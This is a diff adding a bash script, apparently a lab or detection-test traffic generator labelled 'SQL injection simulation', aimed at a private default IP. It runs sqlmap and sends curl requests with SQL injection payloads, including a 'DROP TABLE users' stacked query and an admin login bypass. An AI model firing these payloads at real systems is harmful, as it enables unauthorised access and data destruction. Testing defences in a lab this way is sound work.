@@ -1,0 +1,12 @@
+#!/bin/bash
+set -eu
+
+RUN_ID="${1:-no-run-id}"
+TARGET_IP="${TARGET_IP:-192.168.50.10}"
+
+echo "[run_id=$RUN_ID] SQL injection simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+sqlmap -u "http://$TARGET_IP/?id=1" --batch --level=1 --risk=1 --timeout=5 --retries=1 2>/dev/null || true
+curl -s "http://$TARGET_IP/?id=1+OR+1=1--" -o /dev/null || true
+curl -s "http://$TARGET_IP/?search='; DROP TABLE users;--" -o /dev/null || true
+curl -s "http://$TARGET_IP/?name=admin'--" -o /dev/null || true
+echo "[run_id=$RUN_ID] SQL injection simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
